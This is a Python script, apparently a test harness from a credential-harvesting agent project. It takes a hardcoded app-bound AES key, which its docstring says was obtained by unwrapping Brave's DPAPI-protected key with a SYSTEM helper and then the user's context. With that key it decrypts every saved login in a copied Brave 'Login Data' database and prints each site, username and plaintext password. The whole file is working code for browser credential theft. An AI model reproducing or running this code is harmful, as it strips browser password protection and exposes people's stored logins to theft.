"""Decrypt a real app-bound row with the key the SYSTEM helper produced.

The chain under test: ``Local State`` ships ``app_bound_encrypted_key`` (APPB +
a DPAPI blob), SYSTEM unwraps the outer layer, the current user unwraps the inner
one, and the remaining 32 bytes are the AES-256-GCM key for every ``v20`` row.

Both unwraps happened on the laptop (the artifact's helper, then
``ProtectedData.Unprotect``). This script takes the resulting key and a copy of
Brave's ``Login Data`` and does the last link in Python.
"""

from __future__ import annotations

import sys
from pathlib import Path

ROOT = Path(r"C:\Users\Kuzenee\Desktop\55555\sable")
sys.path.insert(0, str(ROOT))

from agent.sources.browsers import chromium  # noqa: E402

KEY = bytes.fromhex(
    "2a29fb192ecb7f29a4037c7a606ceb502a558791d336ac212423f0aed24a2ccd"
)
DB = Path(r"C:\Users\Kuzenee\Desktop\55555\_harness\_out\laptop\brave-login.db")

keys = chromium.Keys(user=None, app_bound=KEY)
rows = chromium.read_table(
    DB, "logins", chromium._WANTED_PASSWORDS, chromium._MAX_PASSWORDS, "date_last_used DESC"
)
print(f"rows      {len(rows)}")

opened = 0
for row in rows:
    blob = row["password_value"]
    tag = bytes(blob[:3]).decode("ascii", "replace") if blob else "-"
    secret = chromium.secret_value(blob, keys, b"")
    user = chromium.text_value(row["username_value"])
    origin = chromium.text_value(row["origin_url"])
    if secret is None:
        print(f"  [{tag}] {origin:<44} {user:<20} -> no")
        continue
    opened += 1
    print(f"  [{tag}] {origin:<44} {user:<20} -> {secret.decode('utf-8', 'replace')!r}")

print(f"opened    {opened}")
